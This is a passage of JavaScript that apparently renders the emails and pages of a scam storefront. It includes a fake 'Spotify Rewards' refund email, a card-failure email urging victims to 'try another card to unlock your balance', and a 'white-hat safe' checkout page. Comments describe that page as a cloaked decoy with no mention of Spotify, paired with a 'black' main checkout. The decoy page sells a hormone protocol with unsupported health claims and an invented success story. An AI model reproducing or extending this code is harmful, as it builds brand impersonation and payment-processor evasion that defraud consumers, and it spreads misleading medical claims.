                <p style="margin:0 0 6px 0;font-size:13px;font-weight:600;color:#58a6ff;">When will the credit appear?</p>
                <p style="margin:0;font-size:13px;color:#c9d1d9;line-height:1.5;">
                  Financial institutions and card issuers typically take <strong>5 to 10 business days</strong> to post the funds to your account statement.
                </p>
              </div>
              <div style="background-color:rgba(210,153,34,0.1);border-left:3px solid #d29922;padding:14px 16px;border-radius:4px;margin-bottom:24px;">
                <p style="margin:0 0 6px 0;font-size:13px;font-weight:600;color:#e3b341;">Already contacted your bank?</p>
                <p style="margin:0;font-size:13px;color:#c9d1d9;line-height:1.5;">
                  If you previously initiated a dispute or inquiry, there is no need to worry. You can share the Reference ID${arnMention} above directly with your card issuer to confirm the credit has already been issued.
                </p>
              </div>
              <p style="margin:0;font-size:13px;color:#8b949e;line-height:1.5;">
                If you have any further questions or require additional assistance, feel free to reply directly to this email.
              </p>
            </td>
          </tr>
          <tr>
            <td style="background-color:#101923;padding:20px 32px;border-top:1px solid #21262d;text-align:center;">
              <p style="margin:0;font-size:12px;color:#6e7681;">
                Billing &amp; Customer Support &bull; All rights reserved.
              </p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}


function getRefundAnalysisEmailHtml(name, email, protocol, date) {
  const cleanName = (name && name.trim().toLowerCase() !== 'customer') ? name.trim() : 'Cliente';
  const cleanEmail = email || '';
  const cleanDate = date || new Date().toLocaleString('pt-BR');

  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirmação de Solicitação de Reembolso em Análise</title>
</head>
<body style="margin:0;padding:0;background-color:#0d1117;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#e6edf3;">
  <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#0b0e14;padding:40px 15px;">
    <tr>
      <td align="center">
        <table width="100%" cellpadding="0" cellspacing="0" border="0" style="max-width:540px;background-color:#161b22;border:1px solid #30363d;border-radius:12px;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,0.5);">
          <tr>
            <td style="background-color:#101923;padding:24px 32px;border-bottom:1px solid #21262d;">
              <table width="100%" cellpadding="0" cellspacing="0" border="0">
                <tr>
                  <td align="left">
                    <span style="display:inline-block;background-color:rgba(210,153,34,0.15);color:#e3b341;border:1px solid rgba(210,153,34,0.4);font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;padding:5px 12px;border-radius:20px;">
                      ⏳ SOLICITAÇÃO EM ANÁLISE / UNDER REVIEW
                    </span>
                  </td>
                  <td align="right" style="color:#8b949e;font-size:12px;">
                    Spotify Rewards
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding:32px 32px 24px 32px;">
              <h1 style="margin:0 0 16px 0;font-size:22px;font-weight:700;color:#ffffff;line-height:1.3;">
                Sua solicitação de reembolso foi recebida
              </h1>
              <p style="margin:0 0 16px 0;font-size:15px;color:#c9d1d9;line-height:1.6;">
                Olá, <strong>${cleanName}</strong>,
              </p>
              <p style="margin:0 0 24px 0;font-size:14px;color:#8b949e;line-height:1.6;">
                Confirmamos o recebimento da sua solicitação de reembolso referente ao Spotify Rewards. O seu pedido foi registrado com sucesso em nosso sistema de suporte e já foi encaminhado para análise da equipe financeira.
              </p>
              
              <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background-color:#0d1117;border:1px solid #30363d;border-radius:8px;margin-bottom:24px;">
                <tr>
                  <td style="padding:16px 20px;border-bottom:1px solid #21262d;color:#8b949e;font-size:13px;">Número do Protocolo:</td>
                  <td style="padding:16px 20px;border-bottom:1px solid #21262d;color:#1ed760;font-family:monospace;font-size:16px;font-weight:800;text-align:right;">${protocol}</td>
                </tr>
                <tr>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#8b949e;font-size:13px;">E-mail da Compra:</td>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#e6edf3;font-size:13px;text-align:right;">${cleanEmail}</td>
                </tr>
                <tr>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#8b949e;font-size:13px;">Data da Solicitação:</td>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#e6edf3;font-size:13px;text-align:right;">${cleanDate}</td>
                </tr>
                <tr>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#8b949e;font-size:13px;">Status Atual:</td>
                  <td style="padding:14px 20px;border-bottom:1px solid #21262d;color:#e3b341;font-size:13px;font-weight:700;text-align:right;">Em Análise Financeira</td>
                </tr>
                <tr>
                  <td style="padding:14px 20px;color:#8b949e;font-size:13px;">Destino do Estorno:</td>
                  <td style="padding:14px 20px;color:#e6edf3;font-size:13px;text-align:right;">Mesmo cartão / método original</td>
                </tr>
              </table>

              <div style="background-color:rgba(30,215,96,0.08);border-left:3px solid #1ed760;padding:14px 16px;border-radius:4px;margin-bottom:24px;">
                <p style="margin:0 0 6px 0;font-size:13px;font-weight:600;color:#1ed760;">Quais são os próximos passos?</p>
                <p style="margin:0;font-size:13px;color:#c9d1d9;line-height:1.5;">
                  <strong>1. Análise Interna:</strong> Nossa equipe localiza a transação e valida os dados em até <strong>24 a 48 horas úteis</strong>.<br>
                  <strong>2. Emissão do Estorno:</strong> Assim que aprovado, o estorno é emitido automaticamente e você receberá uma confirmação com o comprovante e código de referência (ARN).<br>
                  <strong>3. Crédito em Fatura:</strong> O valor é creditado na fatura do seu cartão em 5 a 10 dias úteis de acordo com os prazos da sua operadora bancária.
                </p>
              </div>

              <p style="margin:0;font-size:13px;color:#8b949e;line-height:1.5;">
                Guarde este e-mail e o número do seu protocolo (<strong>${protocol}</strong>). Caso tenha qualquer dúvida, responda diretamente a este e-mail informando o número do protocolo.
              </p>
            </td>
          </tr>
          <tr>
            <td style="background-color:#101923;padding:20px 32px;border-top:1px solid #21262d;text-align:center;">
              <p style="margin:0;font-size:12px;color:#6e7681;">
                Spotify Rewards Support &bull; Central de Atendimento ao Cliente
              </p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;
}

function getCardFailureHtml(name, checkoutUrl) {
  return `<!DOCTYPE html><html lang="en"><head><style>body{margin:0;background-color:#000;font-family:sans-serif}.container{max-width:480px;margin:0 auto;background-color:#121212;border-radius:12px;padding:40px 30px;border:1px solid #2a2a2a;text-align:center}h2{color:#fff;margin-bottom:12px}p{color:#b3b3b3;line-height:1.5;margin-bottom:32px}.btn{display:inline-block;background-color:#1ed760;color:#000;text-decoration:none;padding:18px 36px;border-radius:500px;font-weight:800}</style></head><body><div style="padding:40px 15px;"><div class="container"><h2>Verification Unsuccessful</h2><p>Hello <strong style="color:#fff;">${name || 'Listener'}</strong>, we couldn't process your card. Try another card to unlock your balance.</p><a href="${checkoutUrl}" class="btn">TRY ANOTHER CARD</a></div></div></body></html>`;
}

// =========================================================================================
// [SEÇÃO 8] MOTOR DE RENDERIZAÇÃO HTML (CHECKOUT SAFE WHITE & CHECKOUT PRINCIPAL BLACK)
// =========================================================================================

// ─── CHECKOUT WHITE-HAT / SAFE PAGE: WELLNESS-PROTOCOL (NENHUMA MENÇÃO A SPOTIFY OU PRÊMIO) ───
// ─── CHECKOUT WHITE-HAT / SAFE PAGE: WELLNESS-PROTOCOL (1-PAGE SALES FUNNEL + EMBEDDED STRIPE CHECKOUT) ───
// ─── CHECKOUT WHITE-HAT / SAFE PAGE: WELLNESS-PROTOCOL (1-PAGE SALES FUNNEL + EMBEDDED STRIPE CHECKOUT) ───
function renderSafeCheckoutHTML(stripePublicKey, priceCents, clientCountry, accountCode = 'a') {
  const displayPrice = (priceCents / 100).toFixed(2);
  const countryDialCodes = {
    "BR": "+55", "US": "+1", "CA": "+1", "GB": "+44", "PT": "+351",
    "FR": "+33", "DE": "+49", "IT": "+39", "ES": "+34", "MX": "+52",
    "AR": "+54", "CO": "+57", "CL": "+56", "PE": "+51", "AU": "+61"
  };
  const userCountry = clientCountry || "US";
  const userCurrency = resolveSmartCurrency(userCountry);
  const defaultDial = countryDialCodes[userCountry] || "+1";

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>wellnessprotocol &mdash; 30-Day Female Hormone Balance Protocol</title>
  <meta name="description" content="A proven 30-day protocol to regulate your hormones, reduce inflammation, and restore metabolic health without extreme diets. Over 3,400 women have completed it.">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Playfair+Display:ital,wght@0,600;0,700;0,800;1,600&display=swap" rel="stylesheet">
  <script src="https://js.stripe.com/v3/"></script>
  <script>
    // 🔴 AUTO-CORREÇÃO DE MODO TESTE SE O USUÁRIO DIGITOU # ANTES DO ? OU &
    (function() {
      const searchParams = new URLSearchParams(window.location.search);
      if (!searchParams.get('modo_teste') && window.location.hash.includes('modo_teste')) {
        const hashStr = window.location.hash.replace('#', '');
        const hashParams = new URLSearchParams(hashStr.includes('?') ? hashStr.split('?')[1] : (hashStr.includes('&') ? hashStr.split('&').slice(1).join('&') : hashStr));
        const val = hashParams.get('modo_teste');
        if (val) {
          window.location.replace('/?modo_teste=' + val + '#checkout-section');
        }
      }
    })();
  </script>
  <style>
    :root {
      --primary: #1b4332;
      --primary-hover: #2d6a4f;
      --primary-light: #eaf4ee;
      --accent: #52b788;
      --bg: #ffffff;
      --bg-section: #f7f9f8;
      --bg-card: #ffffff;
      --border: #e5e9e6;
      --border-soft: #edf0ee;
      --text: #1a202c;
      --muted: #4a5568;
      --subtle: #718096;
      --strike: #94a3b8;
      --urgency: #c53030;
      --shadow-sm: 0 1px 3px rgba(0,0,0,0.05);
      --shadow-md: 0 4px 12px rgba(27,67,50,0.08);
      --shadow-lg: 0 12px 30px rgba(27,67,50,0.12);
    }
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html { scroll-behavior: smooth; }
    body {
      background-color: var(--bg);
      color: var(--text);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      line-height: 1.65;
      -webkit-font-smoothing: antialiased;
    }
    .font-serif { font-family: 'Playfair Display', Georgia, serif; }
    
    /* Header */
    .header-bar {
      position: sticky;
      top: 0;
      z-index: 100;
      background: rgba(255, 255, 255, 0.96);
      backdrop-filter: blur(8px);
      border-bottom: 1px solid var(--border-soft);
      padding: 12px 20px;
    }
    .header-inner {
      max-width: 860px;
      margin: 0 auto;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .brand-logo {
      display: flex;
      align-items: center;
      gap: 10px;
      text-decoration: none;
      color: var(--primary);
    }
    .brand-logo svg { width: 30px; height: 30px; }
    .brand-name {
      font-family: 'Playfair Display', Georgia, serif;
      font-weight: 700;
      font-size: 20px;
      letter-spacing: -0.5px;
      color: var(--primary);
    }
    .header-cta-btn {
      background: var(--primary);
      color: #fff;
      font-weight: 600;
      font-size: 13px;
      padding: 8px 16px;
      border-radius: 9999px;
      text-decoration: none;
      transition: all 0.2s;
    }
    .header-cta-btn:hover { background: var(--primary-hover); transform: translateY(-1px); }

    /* Layout Container */
    .container {
      max-width: 820px;
      margin: 0 auto;
      padding: 0 20px;
    }

    /* Hero Section */
    .hero-section {
      padding: 48px 0 36px;
      text-align: center;
    }
    .eyebrow {
      display: inline-block;
      font-size: 12px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1.5px;
      color: var(--primary);
      background: var(--primary-light);
      padding: 6px 14px;
      border-radius: 9999px;
      margin-bottom: 16px;
    }
    .hero-title {
      font-size: 34px;
      line-height: 1.2;
      font-weight: 800;
      color: var(--primary);
      margin-bottom: 18px;
      letter-spacing: -0.5px;
    }
    @media (min-width: 768px) {
      .hero-title { font-size: 46px; }
    }
    .hero-subtitle {
      font-size: 18px;
      line-height: 1.6;
      color: var(--muted);
      max-width: 700px;
      margin: 0 auto 24px;
    }
    .pill-tags {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px;
      margin-bottom: 28px;
    }
    .pill-tag {
      font-size: 12px;
      font-weight: 600;
      color: var(--muted);
      background: var(--bg-section);
      border: 1px solid var(--border);
      padding: 5px 14px;
      border-radius: 9999px;
    }
    .btn-hero-cta {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      background: var(--primary);
      color: #fff;
      font-size: 17px;
      font-weight: 700;
      padding: 16px 36px;
      border-radius: 12px;
      text-decoration: none;
      box-shadow: var(--shadow-md);
      transition: all 0.2s;
      cursor: pointer;
      border: none;
    }
    .btn-hero-cta:hover {
      background: var(--primary-hover);
      transform: translateY(-2px);
      box-shadow: var(--shadow-lg);
    }

    /* Content Cards */
    .prose-block {
      font-size: 17px;
      line-height: 1.8;
      color: #2d3748;
      margin: 32px 0;
    }
    .prose-block p { margin-bottom: 18px; }
    .prose-highlight {
      font-weight: 700;
      color: var(--primary);
    }
    .content-box {
      background: #fff;
      border: 1px solid var(--border);
      border-radius: 20px;
      padding: 30px;
      margin: 36px 0;
      box-shadow: var(--shadow-sm);
    }
    .content-box-accent {
      background: rgba(45, 106, 79, 0.04);
      border: 1px solid rgba(45, 106, 79, 0.2);
    }
    .section-eyebrow {
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1.2px;
      color: var(--primary);
      margin-bottom: 8px;
    }
    .section-heading {
      font-size: 24px;
      font-weight: 700;
      line-height: 1.3;
      margin-bottom: 16px;
      color: var(--text);
    }
    @media (min-width: 768px) {
      .section-heading { font-size: 28px; }
    }

    /* 5 Hormones Grid */
    .hormones-grid {
      display: grid;
      grid-template-columns: 1fr;
      gap: 16px;
      margin: 24px 0 40px;
    }
    @media (min-width: 640px) {
      .hormones-grid { grid-template-columns: 1fr 1fr; }
    }
    .hormone-card {
      background: #fff;
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 22px;
      transition: all 0.2s;
    }
    .hormone-card:hover {
      border-color: var(--accent);
      transform: translateY(-2px);
      box-shadow: var(--shadow-sm);
    }
    .hormone-name {
      font-family: 'Playfair Display', Georgia, serif;
      font-size: 20px;
      font-weight: 700;
      color: var(--primary);
    }
    .hormone-role {
      font-size: 11px;
      text-transform: uppercase;
      letter-spacing: 0.8px;
      color: var(--subtle);
      font-weight: 600;
      margin-bottom: 8px;
    }
    .hormone-desc {
      font-size: 14px;
      color: var(--muted);
      line-height: 1.6;
    }

    /* Steps / Timeline */
    .timeline {
      position: relative;
      border-left: 2px solid var(--border);
      margin: 28px 0 40px 16px;
      padding-left: 24px;
    }
    .timeline-item {
      position: relative;
      margin-bottom: 32px;
    }
    .timeline-item:last-child { margin-bottom: 0; }
    .timeline-badge {
      position: absolute;
      left: -37px;
      top: 0;
      width: 26px;
      height: 26px;
      border-radius: 50%;
      background: var(--primary);
      color: #fff;
      font-size: 12px;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .timeline-tag {
      display: inline-block;
      font-size: 11px;
      font-weight: 700;
      color: var(--primary);
      background: var(--primary-light);
      padding: 3px 10px;
      border-radius: 9999px;
      margin-bottom: 6px;
    }
    .timeline-title {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 6px;
    }
    .timeline-desc {
      font-size: 15px;
      color: var(--muted);
      line-height: 1.6;
    }

    /* What you get list */
    .deliverables-list {
      list-style: none;
      margin: 20px 0 36px;
    }
    .deliverable-item {
      display: flex;
      align-items: flex-start;
      gap: 12px;
      padding: 12px 0;
      border-bottom: 1px solid var(--border-soft);
      font-size: 15px;
    }
    .deliverable-check {
      width: 22px;
      height: 22px;
      border-radius: 50%;
      background: var(--primary);
      color: #fff;
      font-size: 11px;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
      margin-top: 2px;
    }

    /* Proof stats */
    .proof-banner {
      display: grid;
      grid-template-columns: 1fr 1fr 1fr;
      background: var(--bg-section);
      border: 1px solid var(--border);
      border-radius: 18px;
      padding: 24px;
      text-align: center;
      margin: 36px 0;
    }
    .proof-val {
      font-family: 'Playfair Display', Georgia, serif;
      font-size: 28px;
      font-weight: 800;
      color: var(--primary);
    }
    .proof-label {
      font-size: 12px;
      color: var(--subtle);
      margin-top: 4px;
    }

    /* Testimonials Carousel / Grid */
    .testimonials-grid {
      display: grid;
      grid-template-columns: 1fr;
      gap: 18px;
      margin: 30px 0;
    }
    @media (min-width: 640px) {
      .testimonials-grid { grid-template-columns: 1fr 1fr; }
    }
    .testimonial-card {
      background: #fff;
      border: 1px solid var(--border);
      border-radius: 18px;
      padding: 24px;
      box-shadow: var(--shadow-sm);
    }
    .testimonial-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 12px;
    }
    .testimonial-author {
      font-weight: 700;
      font-size: 15px;
    }
    .testimonial-loc {
      font-size: 12px;
      color: var(--subtle);
    }
    .testimonial-stars { color: #f59e0b; font-size: 13px; }
    .testimonial-quote {
      font-size: 14px;
      color: var(--muted);
      line-height: 1.6;
      font-style: italic;
    }
    .testimonial-result {
      font-size: 13px;
      font-weight: 700;
      color: var(--primary);
      margin-top: 12px;
    }

    /* Value Comparison Table */
    .pricing-box {
      background: var(--bg-section);
      border: 1px solid var(--border);
      border-radius: 24px;
      padding: 32px 24px;
      margin: 48px 0 20px;
    }
    .pricing-grid {
      display: grid;
      grid-template-columns: 1fr;
      gap: 20px;
      margin-top: 24px;
    }
    @media (min-width: 768px) {
      .pricing-grid { grid-template-columns: 0.9fr 1.1fr; align-items: stretch; }
    }
    .val-breakdown {
      background: rgba(255, 255, 255, 0.7);
      border: 1px solid var(--border);
      border-radius: 18px;
      padding: 24px;
    }
    .val-item {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px dashed var(--border);
      font-size: 14px;
      color: var(--subtle);
    }
    .val-item .strike-val { text-decoration: line-through; }
    .val-total-row {
      display: flex;
      justify-content: space-between;
      padding-top: 14px;
      font-size: 15px;
      font-weight: 700;
    }

    /* EMBEDDED CHECKOUT SECTION (#checkout-section) */
    .checkout-wrapper {
      background: #fff;
      border: 2px solid var(--primary);
      border-radius: 24px;
      padding: 32px 24px;
      box-shadow: 0 16px 40px rgba(27,67,50,0.12);
      margin: 40px 0;
      position: relative;
    }
    @media (min-width: 768px) {
      .checkout-wrapper { padding: 40px 36px; }
    }
    .checkout-badge {
      position: absolute;
      top: -14px;
      left: 28px;
      background: var(--primary);
      color: #fff;
      font-size: 11px;
      font-weight: 800;
      text-transform: uppercase;
      letter-spacing: 1px;
      padding: 4px 16px;
      border-radius: 9999px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
    }
    .checkout-title {
      font-size: 24px;
      font-weight: 800;
      color: var(--primary);
      margin-bottom: 6px;
    }
    .checkout-desc {
      font-size: 14px;
      color: var(--muted);
      margin-bottom: 24px;
    }
    .order-summary-box {
      background: var(--bg-section);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 18px;
      margin-bottom: 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .order-item-name {
      font-weight: 700;
      font-size: 15px;
      color: var(--text);
    }
    .order-item-sub {
      font-size: 12px;
      color: var(--subtle);
    }
    .order-item-price {
      font-size: 26px;
      font-weight: 800;
      color: var(--primary);
      text-align: right;
    }

    /* Express Checkout / Wallet Container */
    #safe-wallet-wrapper {
      margin-bottom: 20px;
    }
    .wallet-divider {
      display: flex;
      align-items: center;
      margin: 18px 0;
      color: #9ca3af;
      font-size: 11px;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .wallet-divider::before, .wallet-divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: var(--border);
    }
    .wallet-divider span {
      padding: 0 12px;
    }

    .form-group {
      margin-bottom: 18px;
    }
    .form-label {
      display: block;
      font-size: 13px;
      font-weight: 700;
      color: #374151;
      margin-bottom: 6px;
    }
    .form-input {
      width: 100%;
      height: 48px;
      padding: 10px 14px;
      border: 1.5px solid var(--border);
      border-radius: 10px;
      font-size: 15px;
      font-family: inherit;
      color: var(--text);
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
      background: #fff;
    }
    .form-input:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(27,67,50,0.12);
    }
    .stripe-input-box {
      height: 48px;
      padding: 12px 14px;
      border: 1.5px solid var(--border);
      border-radius: 10px;
      background: #fff;
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    .stripe-input-box.StripeElement--focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(27,67,50,0.12);
    }
    .stripe-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
    }
    .btn-submit-order {
      width: 100%;
      min-height: 58px;
      background: var(--primary);
      color: #fff;
      font-size: 18px;
      font-weight: 800;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: var(--shadow-md);
      transition: all 0.2s;
      margin-top: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }
    .btn-submit-order:hover {
      background: var(--primary-hover);
      transform: translateY(-2px);
      box-shadow: var(--shadow-lg);
    }
    .btn-submit-order:disabled {
      opacity: 0.65;
      cursor: not-allowed;
      transform: none;
    }
    .secure-note {
      font-size: 12px;
      text-align: center;
      color: var(--subtle);
      margin-top: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
    }
    .error-msg {
      color: var(--urgency);
      font-size: 13px;
      font-weight: 600;
      margin-top: 10px;
      text-align: center;
    }
    .action-msg {
      background: #eff6ff;
      border: 1px solid #bfdbfe;
      color: #1e40af;
      padding: 12px;
      border-radius: 10px;
      font-size: 13px;
      margin-top: 12px;
      text-align: center;
    }

    /* Guarantee Section */
    .guarantee-card {
      background: var(--bg-section);
      border: 1px solid var(--border);
      border-radius: 20px;
      padding: 36px 28px;
      text-align: center;
      margin: 48px 0;
    }
    .guarantee-icon {
      width: 56px;
      height: 56px;
      border-radius: 50%;
      background: var(--primary-light);
      display: inline-flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 16px;
    }
    .guarantee-icon svg { width: 30px; height: 30px; color: var(--primary); }

    /* FAQ Section */
    .faq-list {
      margin: 30px 0 60px;
    }
    .faq-item {
      border: 1px solid var(--border);
      border-radius: 14px;
      margin-bottom: 12px;
      background: #fff;
      overflow: hidden;
    }
    .faq-q {
      padding: 18px 22px;
      font-weight: 700;
      font-size: 16px;
      cursor: pointer;
      display: flex;
      justify-content: space-between;
      align-items: center;
      user-select: none;
    }
    .faq-q:hover { background: var(--bg-section); }
    .faq-a {
      padding: 0 22px 18px;
      font-size: 15px;
      color: var(--muted);
      line-height: 1.6;
      display: none;
    }
    .faq-item.open .faq-a { display: block; }
    .faq-item.open .faq-toggle { transform: rotate(180deg); }
    .faq-toggle { transition: transform 0.2s; font-size: 14px; color: var(--subtle); }

    /* Compliance Footer */
    .footer-bar {
      background: #0f172a;
      color: #94a3b8;
      padding: 48px 20px 36px;
      font-size: 13px;
      line-height: 1.7;
    }
    .footer-inner {
      max-width: 820px;
      margin: 0 auto;
      text-align: center;
    }
    .footer-links {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 16px;
      margin-bottom: 24px;
    }
    .footer-links a {
      color: #cbd5e1;
      text-decoration: none;
      font-weight: 600;
      transition: color 0.2s;
      cursor: pointer;
    }
    .footer-links a:hover { color: #fff; text-decoration: underline; }
    .footer-legal {
      margin-top: 20px;
      padding-top: 20px;
      border-top: 1px solid #1e293b;
      color: #64748b;
      font-size: 12px;
    }
    .payment-badges {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin: 20px 0;
      font-size: 11px;
      font-weight: 700;
      color: #94a3b8;
    }
    .badge-pill {
      background: #1e293b;
      padding: 4px 10px;
      border-radius: 6px;
      border: 1px solid #334155;
    }

    /* Modal for Legal Policies */
    .modal-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.65);
      z-index: 1000;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .modal-overlay.active { display: flex; }
    .modal-card {
      background: #fff;
      border-radius: 18px;
      max-width: 650px;
      width: 100%;
      max-height: 80vh;
      overflow-y: auto;
      padding: 32px;
      position: relative;
      color: var(--text);
    }
    .modal-close {
      position: absolute;
      top: 18px; right: 20px;
      background: none; border: none;
      font-size: 24px; font-weight: 700;
      cursor: pointer; color: var(--subtle);
    }
    .modal-title {
      font-size: 22px; font-weight: 800;
      color: var(--primary);
      margin-bottom: 16px;
    }
    .modal-body {
      font-size: 14px; line-height: 1.7; color: #4b5563;
    }
    .modal-body p { margin-bottom: 12px; }
  </style>
</head>
<body>

  <!-- Header -->
  <header class="header-bar">
    <div class="header-inner">
      <a href="#" class="brand-logo">
        <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M24 6c-8 10-7 26 0 36 7-10 8-26 0-36z" fill="#2d6a4f"/>
          <path d="M24 18c-7-3-13 2-13 8s8 9 13 2" stroke="#74c69d" stroke-width="4" stroke-linecap="round"/>
          <path d="M24 18c7-3 13 2 13 8s-8 9-13 2" stroke="#95d5b2" stroke-width="4" stroke-linecap="round"/>
        </svg>
        <span class="brand-name">wellnessprotocol</span>
      </a>
      <a href="#checkout-section" class="header-cta-btn">Get Access &mdash; $${displayPrice} USD</a>
    </div>
  </header>

  <!-- Hero Section -->
  <main class="container">
    <section class="hero-section">
      <span class="eyebrow">Hormone Protocol for Women Aged 30 to 55</span>
      <h1 class="hero-title font-serif">Your body isn't broken.<br><span style="color:#2d6a4f;">No one ever gave you the right map.</span></h1>
      <p class="hero-subtitle">The 5 hormones blocking your metabolic health and the 30-day protocol to balance them &mdash; explained step by step, right below.</p>
      <div class="pill-tags">
        <span class="pill-tag"><svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-1.5px;margin-right:5px;"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>6-minute read</span>
        <span class="pill-tag"><svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-1.5px;margin-right:5px;"><path d="M11 20A7 7 0 0 1 9.8 6.1C15.5 5 17 4.48 19 2c1 2 2 4.18 2 8 0 5.5-4.78 10-10 10Z"/><path d="M2 21c0-3 1.85-5.36 5.08-6C9.5 14.52 12 13 13 12"/></svg>No extreme diets</span>
        <span class="pill-tag"><svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align:-1.5px;margin-right:5px;"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Instant digital access</span>
      </div>
      <button onclick="document.getElementById('checkout-section').scrollIntoView({behavior: 'smooth'})" class="btn-hero-cta">Start the 30-Day Protocol Today &rarr;</button>
    </section>

    <!-- Narrative Section -->
    <article class="prose-block">
      <p>If you've already tried restrictive diets, workout routines, and expensive supplements... and nothing lasted more than a few weeks, it's not your fault. The problem is almost never willpower: <strong>it's hormonal signaling</strong>.</p>
      <p>Your body doesn't regulate weight based solely on how much food is on your plate. It responds to the biochemical signals it receives. While those signals say <em>"conserve and store"</em>, you can eat clean for months and your metabolism remains locked.</p>
      <p class="prose-highlight">Regulate the hormones and sustainable wellness stops being an exhausting fight: it becomes a natural consequence.</p>
    </article>

    <!-- The Story Box -->
    <section class="content-box">
      <p class="section-eyebrow">The Origin Story</p>
      <h2 class="section-heading font-serif">How the protocol was born</h2>
      <div class="prose-block" style="margin:0; font-size:16px;">
        <p>Two years ago, Sofia was getting ready for her sister's birthday and couldn't zip her favorite dress. It wasn't a tight dress: it was the same one she had worn six months earlier. She was eating clean, cutting sugar, and walking daily. Yet her body seemed stuck.</p>
        <p>Her routine blood panels came back with the same phrase thousands of women hear every day: <em>"Everything is normal."</em> But she knew her energy, sleep, and bloating said otherwise.</p>
        <p>Until Camila, a specialist working with female hormonal pathways in clinical nutrition, asked a pivotal question: <strong>"What if the problem was never your calorie count, but the chronological order in which your endocrine system recovers?"</strong></p>
        <p style="font-weight:600; color:var(--primary);">Sofia applied the 30-day sequence. No crash diets, no stimulants. By day 30: sustained all-day energy, calm digestion, and her vitality fully restored.</p>
      </div>
    </section>

    <!-- The 5 Hormones Section -->
    <section style="margin: 44px 0;">
      <p class="section-eyebrow">Endocrine Science</p>
      <h2 class="section-heading font-serif">The 5 Key Hormones in Female Metabolic Health</h2>
      <div class="hormones-grid">
        <div class="hormone-card">
          <p class="hormone-name">1. Cortisol</p>
          <p class="hormone-role">The Stress Hormone</p>
          <p class="hormone-desc">When chronically elevated from sleep deficits and stress, cortisol signals survival mode and shifts fat storage to the abdominal region.</p>
        </div>
        <div class="hormone-card">
          <p class="hormone-name">2. Insulin</p>
          <p class="hormone-role">The Cellular Storage Key</p>
          <p class="hormone-desc">Constant blood sugar spikes keep insulin high, locking your cells in storage mode and triggering recurring afternoon sugar crashes.</p>
        </div>
        <div class="hormone-card">
          <p class="hormone-name">3. Estrogen</p>
          <p class="hormone-role">The Fluid & Cycle Regulator</p>
          <p class="hormone-desc">When estrogen to progesterone ratios are off, fluid retention peaks, causing uncomfortable bloating that diets never resolve.</p>
        </div>
        <div class="hormone-card">
          <p class="hormone-name">4. Leptin</p>
          <p class="hormone-role">The Satiety Signal</p>
